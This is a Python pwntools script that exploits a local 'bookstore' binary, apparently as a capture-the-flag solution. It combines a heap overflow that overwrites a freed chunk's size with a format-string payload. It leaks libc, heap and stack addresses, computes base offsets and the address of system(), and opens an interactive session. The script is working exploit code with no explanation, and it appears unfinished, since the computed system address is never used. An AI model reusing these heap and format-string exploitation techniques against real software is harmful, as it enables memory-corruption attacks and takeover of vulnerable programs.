from pwn import *
import time
import ctypes
# context.log_level = 'debug'
libc_base = 0
heap_base = 0
stack_base = 0
data = ""
while heap_base <=0 or stack_base <= 0 or libc_base <= 0 or len(data) != 29:

    p = process("bookstore")
    p.recv()
    # gdb.attach(p)

    # Free order2
    p.writeline("4")

    # Overflow 1
    p.readuntil("Submit\n")
    p.writeline("1")
    p.readuntil("Enter first order:\n")

    #format_string = "%lX."*11 + "%4196830x." + "%n." + "%lX." * 15

    format_string = "%lX."*11 + "%4196830x." + "%n." + "%lX."*15

    # put format str, overflow size of freed chunk2
    p.writeline(
        format_string +
        ("A" * (0x80 - len(format_string))) +
        ("\x00" * 8) + 
        "\x50\x01"
    )

    # brute forcing addr of system
    fmt_str_target = p64(0x6011b8)*2
    p.writeline("5AAAAAAA" + fmt_str_target)

    data = p.recv()
    try:
        print data
        data = data.split("\n")

        print data
        data = data[-2].split(".")

        print data

        libc_leak = ctypes.c_uint64(
            int(data[1], 16)
        ).value

        heap_leak = ctypes.c_uint64(
            int(data[6], 16)
        ).value

        stack_leak = ctypes.c_uint64(
            int(data[-2], 16)
        ).value

        libc_base = libc_leak - 3954560
        heap_base = heap_leak - 0xa0
        stack_base = stack_leak - 131296
        print len(data) 
        print "libc base =", hex(libc_base)
        print "heap base =", hex(heap_base)
        print "stack base =", hex(stack_base)
        p.interactive()
    except:
        p.close()
        pass

system_addr = libc_base + 283536

while p.can_recv():
    p.recv()
p.interactive()
